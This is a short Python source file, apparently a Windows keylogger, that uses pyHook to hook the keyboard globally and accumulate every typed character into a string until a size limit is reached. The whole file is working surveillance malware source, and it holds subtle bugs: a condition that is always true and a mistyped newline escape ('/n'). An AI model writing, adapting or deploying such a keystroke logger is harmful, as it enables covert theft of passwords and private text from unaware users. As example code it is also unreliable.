import win32api 
import sys
import pythoncom, pyHook 

keysPressed = ">"
def OnKeyboardEvent(event):
    global keysPressed    
    if event.Ascii != 0 or 8: 
        keysPressed += chr(event.Ascii) 
    if event.Ascii == 13: 
        keysPressed += "/n"
    return True

def keylogger_win(size):       
    global keysPressed   
    hm = pyHook.HookManager()  
    hm.KeyDown = OnKeyboardEvent 
    hm.HookKeyboard() 
    while len(keysPressed) < size:
        pythoncom.PumpWaitingMessages()
    else:
        hm.UnhookKeyboard()
        return keysPressed